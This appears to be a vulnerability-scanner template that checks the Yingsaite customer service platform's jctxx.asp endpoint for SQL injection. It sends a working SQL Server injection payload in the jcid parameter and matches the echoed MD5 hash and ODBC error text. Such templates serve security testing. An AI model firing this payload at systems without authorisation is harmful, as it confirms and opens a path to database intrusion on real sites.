id: poc-yaml-yingsaite-icsp-jctxx-asp-sqli
info:
  name: 英赛特互联网客户服务平台 jctxx.asp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in 英赛特互联网客户服务平台 at the endpoint /csccmise/jctxx.asp.

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - method: GET
    path:
      - '{{BaseURL}}/csccmise/jctxx.asp?jcid=sys.fn_varbintohexstr(hashbytes(''MD5'',''{{t1}}''))'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - '{{t2}}'
          - "SQL"
          - "ODBC"
          - "/csccmise/jctxx.asp"
